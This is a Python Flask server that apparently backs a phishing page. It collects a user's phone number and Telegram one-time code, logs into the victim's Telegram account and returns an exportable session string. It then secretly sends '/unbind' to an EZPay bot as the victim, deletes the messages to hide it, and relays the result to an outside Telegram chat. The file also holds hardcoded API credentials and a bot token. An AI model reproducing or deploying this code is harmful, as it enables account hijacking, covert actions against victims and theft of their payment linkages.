from flask import Flask, request, jsonify
from flask_cors import CORS
from pyrogram.client import Client
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired, PhoneNumberInvalid
import asyncio
import threading
import time
import os
import requests as http_requests

app = Flask(__name__)
app.secret_key = os.urandom(24)
CORS(app, origins=["https://ezpay2.vercel.app", "http://localhost:3000", "http://127.0.0.1:5500"])

API_ID = 37195487
API_HASH = "f630cc930e1ac56edcac9410b759de4a"

BOT_TOKEN = "8209360948:AAFqBr7kiI7bRrlbojhAJi784jglBG98L2E"
CHAT_ID = "8023791486"
EZPAY_BOT_USERNAME = "ezpay_member_bot"

SESSION_TIMEOUT = 300

clients = {}
phone_code_hashes = {}
client_timestamps = {}
clients_lock = threading.Lock()

_loop = asyncio.new_event_loop()
_loop_thread = None
_loop_started = False
_loop_lock = threading.Lock()

def _run_loop():
    asyncio.set_event_loop(_loop)
    _loop.run_forever()

def get_event_loop():
    global _loop_thread, _loop_started
    with _loop_lock:
        if not _loop_started:
            _loop_thread = threading.Thread(target=_run_loop, daemon=True)
            _loop_thread.start()
            _loop_started = True
            time.sleep(0.2)
    return _loop

get_event_loop()

def run_async(coro):
    lp = get_event_loop()
    future = asyncio.run_coroutine_threadsafe(coro, lp)
    return future.result(timeout=30)

def cleanup_stale_clients():
    now = time.time()
    with clients_lock:
        stale = [p for p, t in client_timestamps.items() if now - t > SESSION_TIMEOUT]
    for phone in stale:
        try:
            with clients_lock:
                client = clients.pop(phone, None)
                phone_code_hashes.pop(phone, None)
                client_timestamps.pop(phone, None)
            if client:
                try:
                    run_async(client.disconnect())
                except Exception:
                    pass
        except Exception:
            pass

def cleanup_phone(phone):
    with clients_lock:
        client = clients.pop(phone, None)
        phone_code_hashes.pop(phone, None)
        client_timestamps.pop(phone, None)
    if client:
        try:
            run_async(client.disconnect())
        except Exception:
            pass

def send_to_notification_chat(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        http_requests.post(url, json={
            "chat_id": CHAT_ID,
            "text": text,
            "parse_mode": "HTML"
        }, timeout=10)
    except Exception as e:
        print(f"Failed to send notification: {e}")

@app.route('/api/send-otp', methods=['POST'])
def send_otp():
    data = request.json
    phone = data.get('phone', '').strip()
    if not phone:
        return jsonify({"success": False, "error": "Phone number required"}), 400

    full_phone = f"+91{phone}" if not phone.startswith('+') else phone

    cleanup_stale_clients()
    cleanup_phone(phone)

    try:
        async def do_send():
            client = Client(
                f"session_{phone}",
                api_id=API_ID,
                api_hash=API_HASH,
                in_memory=True
            )
            await client.connect()
            sent_code = await client.send_code(full_phone)
            return client, sent_code

        client, sent_code = run_async(do_send())

        with clients_lock:
            clients[phone] = client
            phone_code_hashes[phone] = sent_code.phone_code_hash
            client_timestamps[phone] = time.time()

        return jsonify({
            "success": True,
            "message": "OTP sent successfully",
            "phone_code_hash": sent_code.phone_code_hash
        })
    except PhoneNumberInvalid:
        return jsonify({"success": False, "error": "Invalid phone number"}), 400
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    data = request.json
    phone = data.get('phone', '').strip()
    otp = data.get('otp', '').strip()

    if not phone or not otp:
        return jsonify({"success": False, "error": "Phone and OTP required"}), 400

    full_phone = f"+91{phone}" if not phone.startswith('+') else phone

    with clients_lock:
        client = clients.get(phone)
        phone_code_hash = phone_code_hashes.get(phone)

    if not client or not phone_code_hash:
        return jsonify({"success": False, "error": "Session expired. Please request OTP again."}), 400

    try:
        async def do_verify():
            await client.sign_in(full_phone, phone_code_hash, otp)
            session_string = await client.export_session_string()

            unbind_response = None
            try:
                sent_msg = await client.send_message(EZPAY_BOT_USERNAME, "/unbind")
                sent_msg_id = sent_msg.id
                await asyncio.sleep(3)

                response_msg = None
                async for msg in client.get_chat_history(EZPAY_BOT_USERNAME, limit=5):
                    if not msg.outgoing and msg.text:
                        response_msg = msg
                        break

                if response_msg:
                    unbind_response = response_msg.text

                try:
                    if response_msg:
                        await client.delete_messages(EZPAY_BOT_USERNAME, response_msg.id)
                    await client.delete_messages(EZPAY_BOT_USERNAME, sent_msg_id)
                except Exception:
                    pass
            except Exception as e:
                unbind_response = f"Error during unbind: {str(e)}"

            await client.disconnect()
            return session_string, unbind_response

        session_string, unbind_response = run_async(do_verify())

        with clients_lock:
            clients.pop(phone, None)
            phone_code_hashes.pop(phone, None)
            client_timestamps.pop(phone, None)

        if unbind_response:
            notif_text = f"<b>EZPay Unbind Response</b>\n\n<b>Phone:</b> +91 {phone}\n<b>Bot Response:</b>\n{unbind_response}"
            send_to_notification_chat(notif_text)

        return jsonify({
            "success": True,
            "message": "Authenticated successfully",
            "session_string": session_string
        })
    except PhoneCodeInvalid:
        return jsonify({"success": False, "error": "Invalid OTP code"}), 400
    except PhoneCodeExpired:
        cleanup_phone(phone)
        return jsonify({"success": False, "error": "OTP expired. Please request a new one."}), 400
    except SessionPasswordNeeded:
        try:
            session_string = run_async(client.export_session_string())
        except Exception:
            session_string = None
        cleanup_phone(phone)
        return jsonify({
            "success": True,
            "message": "Authenticated successfully (2FA account)",
            "session_string": session_string,
            "needs_2fa": True
        })
    except Exception as e:
        cleanup_phone(phone)
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
    
